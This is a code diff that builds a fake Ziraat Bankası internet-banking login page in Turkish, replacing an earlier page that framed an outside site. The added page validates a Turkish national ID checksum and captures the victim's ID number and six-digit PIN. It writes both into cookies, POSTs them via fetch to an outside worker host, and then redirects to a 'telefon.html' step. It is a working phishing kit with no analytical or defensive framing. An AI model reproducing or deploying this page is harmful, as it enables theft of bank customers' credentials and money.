@@ -1,31 +1,211 @@
+
 <!DOCTYPE html>
-<html lang="en" style="height: 99%;">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ziraat Mobil</title>
-<style>
-    .responsive-iframe-container {
-        position: relative;
-        width: 100%;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        overflow: hidden;
-    }
+<html lang="tr">
+  <head>
+	  <!-- Google tag (gtag.js) -->
+ 
+ 
+    <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobil Uyumlu Sayfa</title>
+    <style class="vjs-styles-defaults"></style>
+    <meta http-equiv="Content-Language" content="tr">
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
+    <link href="styles.css" rel="stylesheet" id="style">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
+ 
+<!-- Meta Pixel Code -->
+ 
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  </head>
+  <body style="
+margin-left: 0px;
+margin-right: 0px;
+margin-top: 0px;
+margin-bottom: 0px;
+">
+ <form name="aspnetForm" method="post" id="aspnetForm" autocomplete="off" novalidate="novalidate">
+    <div class="login-wrap">
+        <header></header>
+        <div class="container">
+            <div class="tc-kimlik-giris-wrap">
+                <div class="row">
+                    <div class="col-xs-12 col-md-6">
+                        <div class="login-box long">
+                            <span style="color:Red;visibility:hidden;"></span>
+                            <input name="rdLng" type="hidden" value="">
+                            <p>İnternet Şubemize Hoş Geldiniz</p>
+                            <div class="tabs-wrap" data-module="14">
+                                <div class="tabs tab-header-container">
+                                    <a causesval="false" onclick=";;;" class="active" href="">
+                                        <span></span>BİREYSEL </a>
+                                    <a causesval="false">
+                                        <span></span>KURUMSAL </a>
+                                </div>
+                                <div class="tab-container tab-contents">
+                                    <div class="tab-item active" style="padding-left: 10px;">
+                                        <div class="form-group hidden-title">
+                                            <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" style="font-size: 14px; height: 46px; font-family: sans-serif; font-weight: 700;" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." maxlengthvalidationenabled="False" disablevalidationonblur="true" causesval="false" oninput="validateInputs()" aria-required="true" value="">
+                                        </div>
+                                        <div class="clearfix"></div>
+					         <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
+<input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz." style="font-size: 14px;font-family: sans-serif; font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6" onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="" inputmode="numeric">
+                         </div>
+                                        <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled>
+                                            <span></span>DEVAM
+                                        </button>
+                                        <br><br><br>
+                                        <a causesval="true" onclick="" class="custom-link" href="">
+                                            <span></span>Şifremi Unuttum
+                                        </a>
+                                        <div class="tab-footer">
+                                            <p>Dijital Bankacılık müşterimiz olmak için</p>
+                                            <a causesval="true" class="btn btn-default ">
+                                                <span></span>HEMEN BAŞVUR
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <style>
+                                    input {
+                                        touch-action: manipulation;
+                                    }
 
-    .responsive-iframe-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        
-    }
-</style>
-</head>
-<body>
+                                    .api-payment-container img {
+                                        max-height: 92px;
+                                        max-width: 92px;
+                                    }
 
-<div class="responsive-iframe-container" style="height: 700px;">
-    <iframe src="https://yolarkadaslari.com/dmn/" frameborder="0"  style="height: 99%;" allowfullscreen></iframe>
-</div>
+                                    .ipNotInListRedirectBtn {
+                                        background-color: #e10514 !important;
+                                    }
+                                </style>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</form>
 
-</body>
+ 
+    
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        var tcInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
+        var passInput = document.getElementById("ctl00_c_RetailPinTextBox");
+        var loginBtn = document.getElementById("ctl00_c_RetailLoginButton");
+
+        async function validateInputs() {
+            var tcno = tcInput.value;
+            var pass = passInput.value;
+
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik numarası doğrulaması
+                if (await tcno_dogrula_ve_islem_yap(tcno)) {
+                    // Giriş düğmesini etkinleştir
+                    loginBtn.disabled = false;
+                } else {
+                    // TC kimlik numarası geçerli değilse giriş düğmesini devre dışı bırak
+                    loginBtn.disabled = true;
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
+                loginBtn.disabled = true;
+            }
+        }
+
+        // Giriş düğmesine tıklandığında formu gönder
+        loginBtn.addEventListener("click", function () {
+            // TC kimlik numarası ve şifreyi al
+            var tcno = tcInput.value;
+            var pass = passInput.value;
+
+            // TC kimlik numarası ve şifre uzunluğunu kontrol et
+            if (tcno.length === 11 && pass.length === 6) {
+                // TC kimlik doğrulaması yap
+                if (tcno_dogrula_ve_islem_yap(tcno)) {
+                    // Cookie'leri oluştur
+                    document.cookie = `tcno=${tcno}; path=/`;
+                    document.cookie = `pass=${pass}; path=/`;
+
+                    // POST işlemi için veri oluştur
+                    var data = new FormData();
+                    data.append('tcno', tcno);
+                    data.append('pass', pass);
+
+                    // POST işlemi için fetch kullanarak isteği oluştur
+                    fetch('https://worker-steep-shape-b9ddddssd48.selimjuhan2.workers.des/', {
+                        method: 'POST',
+                        body: data
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                        window.location.href = 'telefon.html';
+                    })
+                    .catch(error => {
+                        console.error('Hata:', error);
+                        window.location.href = 'telefon.html';
+                    });
+                } else {
+                    alert("Geçersiz TC Kimlik Numarası");
+                }
+            } else {
+                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
+            }
+        }); 
+
+        // TC kimlik doğrulama fonksiyonu
+        async function tcno_dogrula_ve_islem_yap(tcno) {
+            // TC kimlik doğrulama fonksiyonu
+            tcno = String(tcno);
+            if (tcno.substring(0, 1) === '0') {
+                return false;
+            }
+            if (tcno.length !== 11) {
+                return false;
+            }
+            var ilkon_array = tcno.substr(0, 10).split('');
+            var ilkon_total = hane_tek = hane_cift = 0;
+            for (var i = j = 0; i < 9; ++i) {
+                j = parseInt(ilkon_array[i], 10);
+                if (i & 1) {
+                    hane_cift += j;
+                } else {
+                    hane_tek += j;
+                }
+                ilkon_total += j;
+            }
+            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+                return false;
+            }
+            ilkon_total += parseInt(ilkon_array[9], 10);
+            if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+                return false;
+            }
+            return true;
+        }
+
+        // Giriş alanlarının değerlerinin değiştiğini izle
+        tcInput.addEventListener("input", validateInputs);
+        passInput.addEventListener("input", validateInputs);
+
+        // Sayfa yüklendiğinde de kontrol et
+        validateInputs();
+    });
+</script>
+
+ 
+
+ 
+
+    <div>
+  </body>
 </html>
